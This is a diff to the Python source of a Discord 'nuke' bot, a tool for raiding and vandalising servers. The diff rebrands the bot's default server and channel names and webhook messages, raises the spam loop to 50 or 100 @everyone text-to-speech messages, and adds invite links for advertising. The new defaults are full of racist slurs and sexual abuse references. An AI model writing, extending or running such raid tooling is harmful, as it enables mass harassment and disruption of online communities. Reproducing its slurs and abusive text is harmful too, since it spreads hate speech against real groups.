@@ -18,10 +18,10 @@ NUKE_STATS_FILE = "nuke_stats.json"
 PREMIUM_FILE = "premium.json"
 CONFIG_FILE = "config.json"
 
-PREM = 1414916058875301939
-MOD_ROLE_ID = 1414916058120192051
+PREM = 1525416750240366693
+MOD_ROLE_ID = 1525416750240366693
 WHITELIST = [1464634211406188721]  # Owner only
-BLACKLISTED_GUILD_ID = 1418550612085440554
+BLACKLISTED_GUILD_ID = 1525971260943892510
 OWNER_ID = 1464634211406188721
 LEADERBOARD_CHANNEL_ID = 1401931021544460389
 TOKEN = ''  # Your bot token
@@ -101,25 +101,25 @@ def set_show_username(user_id, value: bool):
     set_user_config(user_id, "show_username", value)
 
 def get_channel_name(user_id):
-    return get_user_config(user_id).get("channel_name", "1weeksober-on-top")
+    return get_user_config(user_id).get("channel_name", "1week-and-xroven-ontop")
 
 def set_channel_name(user_id, value: str):
     set_user_config(user_id, "channel_name", value)
 
 def get_webhook_name(user_id):
-    return get_user_config(user_id).get("webhook_name", "Corrupt")
+    return get_user_config(user_id).get("webhook_name", "larp and xroven")
 
 def set_webhook_name(user_id, value: str):
     set_user_config(user_id, "webhook_name", value)
 
 def get_webhook_message(user_id):
-    return get_user_config(user_id).get("webhook_message", "@everyone discord.gg/VSQzzAMVw3 Corrupt owns this")
+    return get_user_config(user_id).get("webhook_message", "@everyone larp and noctrya owns # EVERYONE JOIN https://discord.gg/7cEpXZReW https://discord.gg/MAGZB5Aq6")
 
 def set_webhook_message(user_id, value: str):
     set_user_config(user_id, "webhook_message", value)
 
 def get_server_name(user_id):
-    return get_user_config(user_id).get("server_name", "Corrupt owns this")
+    return get_user_config(user_id).get("server_name", "larp and noctrya owns this")
 
 def set_server_name(user_id, value: str):
     set_user_config(user_id, "server_name", value)
@@ -231,8 +231,8 @@ async def setup(ctx):
     save_nuke_stats(user.id, guild)
 
     channel_name = user_config.get("channel_name", "1weeksober-on-top")
-    webhook_message = user_config.get("webhook_message", "@everyone discord.gg/VSQzzAMVw3 Corrupt owns this")
-    server_name = user_config.get("server_name", "Corrupt owns this")
+    webhook_message = user_config.get("webhook_message", "@everyone https://discord.gg/MAGZB5Aq6 https://discord.gg/7cEpXZReW larp and noctrya owns this")
+    server_name = user_config.get("server_name", "LARP AND NOCTRYA owns this")
     role_name = user_config.get("role_name", "1weeksober-on-top")
 
     try:
@@ -250,12 +250,12 @@ async def setup(ctx):
         try:
             ch = await guild.create_text_channel(name=channel_name)
             embed = discord.Embed(
-                title="**__NUKED BY CORRUPT__**",
-                description="`This server has been nuked.`",
+                title="**__NUKED BY 1week and xroven__**",
+                description="`This server has been nuked suck my big ass dick niggers.`",
                 color=0xb161f9
             )
-            embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1395783321895567461/1398652948812267630/11131604.png")
-            spams = 25 if is_premium_user(user.id) else 10
+            embed.set_thumbnail(url="https://i.imgur.com/dHcK9af.jpeg")
+            spams = 100 if is_premium_user(user.id) else 50
             for _ in range(spams):
                 await ch.send(content=webhook_message, embed=embed, tts=True)
         except:
@@ -294,13 +294,13 @@ class SettingsModal(discord.ui.Modal):
         )
         self.webhook_message_input = discord.ui.TextInput(
             label="Webhook Message (Premium required)",
-            placeholder="@everyone discord.gg/VSQzzAMVw3 Corrupt owns this",
+            placeholder="@everyone https://discord.gg/pK7fnsJmp https://discord.gg/MAGZB5Aq6 larp empire and noctrya owns you fuckinh pedofiles niggers",
             default=get_webhook_message(user_id),
             max_length=100
         )
         self.server_name_input = discord.ui.TextInput(
             label="Server Name (Premium required)",
-            placeholder="Corrupt owns this",
+            placeholder="1week and xroven raped ur ass",
             default=get_server_name(user_id),
             max_length=32
         )
@@ -350,3 +350,5 @@ def run_flask():
 
 threading.Thread(target=run_flask).start()
 
+# ================== START BOT ==================
+bot.run(TOKEN)
